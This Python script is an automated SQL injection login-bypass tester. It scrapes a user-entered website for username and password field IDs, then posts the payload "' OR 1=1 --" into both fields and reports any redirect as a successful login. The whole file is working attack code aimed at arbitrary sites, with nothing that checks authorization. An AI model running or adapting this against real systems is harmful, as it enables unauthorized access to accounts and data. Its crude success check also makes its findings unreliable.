import requests
from bs4 import BeautifulSoup

def test_login(url, payloads):
    # Define a function to test login with payloads
    def try_payloads(payload, u_id, p_id):
        # Simulate a POST request with payloads for both 'u' and 'p'
        data = {u_id: payload, p_id: payload}
        print(f"Testing payload '{payload}' with IDs '{u_id}' and '{p_id}'...")
        
        try:
            # Send the POST request and follow redirects
            response = requests.post(url, data=data, allow_redirects=True)
            print(f"Request URL: {response.url}")
            print(f"Request Data: {data}")
            print(f"Initial Response Status Code: {response.status_code}")
            print(f"Initial Response Headers: {response.headers}")
            print(f"Initial Response Content: {response.text[:2000]}")  # Print a snippet of the response content

            # Check if the response indicates a redirect
            if response.history:  # If there were any redirects
                print("Login successful")
            else:
                print("Login unsuccessful")
            
            # Print the response headers after handling redirects
            print("Response Headers after processing:")
            print(f"Final Response Status Code: {response.status_code}")
            print(f"Final Response Headers: {response.headers}")
            print(f"Final Response Content: {response.text[:2000]}")  # Print a snippet of the response content

        except requests.RequestException as e:
            print(f"An error occurred during the request: {e}")

    # Fetch the content of the website
    try:
        response = requests.get(url)
        response.raise_for_status()  # Check if the request was successful

        # Parse the HTML content
        soup = BeautifulSoup(response.content, 'html.parser')

        # Find all <input> elements with either a class or id attribute
        input_elements = soup.find_all(lambda tag: tag.name == 'input' and (tag.has_attr('class') or tag.has_attr('id')))

        # Extract IDs from input elements
        ids = [input_element['id'] for input_element in input_elements if input_element.has_attr('id')]

        # Find IDs starting with 'u' and 'p'
        u_id = next((input_id for input_id in ids if input_id.startswith('u')), None)
        p_id = next((input_id for input_id in ids if input_id.startswith('p')), None)

        if u_id and p_id:
            print(f"Found IDs: '{u_id}' and '{p_id}'. Launching payloads...")
            for payload in payloads:
                try_payloads(payload, u_id, p_id)
        else:
            print("Required IDs starting with 'u' and 'p' not found.")

    except requests.RequestException as e:
        print(f"An error occurred: {e}")

# Input URL from the user
url = input("Enter the website URL: ")

# Define a list of payloads to test
payloads = [
    "' OR 1=1 --"
]

test_login(url, payloads)
